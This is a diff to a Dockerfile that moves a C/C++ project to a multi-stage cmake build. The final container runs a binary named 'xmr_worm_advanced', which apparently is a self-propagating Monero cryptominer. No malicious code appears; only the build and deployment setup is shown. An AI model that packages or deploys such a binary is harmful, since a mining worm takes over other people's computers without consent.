@@ -1,4 +1,5 @@
-FROM ubuntu:22.04
+# ── Stage 1: Build ──────────────────────────────────────────────
+FROM ubuntu:22.04 AS builder
 
 RUN apt-get update && apt-get install -y \
     build-essential \
@@ -10,21 +11,23 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 WORKDIR /app
-
 COPY . .
 
-RUN chmod +x scripts/build.sh && ./scripts/build.sh
+RUN git submodule update --init --recursive \
+    && cmake -B build -DCMAKE_BUILD_TYPE=Release \
+    && cmake --build build -j$(nproc)
 
+# ── Stage 2: Runtime ────────────────────────────────────────────
 FROM ubuntu:22.04
 
 RUN apt-get update && apt-get install -y \
-    libssl-dev \
-    libcurl4-openssl-dev \
+    libssl3 \
+    libcurl4 \
     && rm -rf /var/lib/apt/lists/*
 
 WORKDIR /app
 
-COPY --from=0 /app/xmr_worm_advanced .
-COPY --from=0 /app/config.json .
+COPY --from=builder /app/build/xmr_worm_advanced .
+COPY --from=builder /app/config.json .
 
 CMD ["./xmr_worm_advanced"]
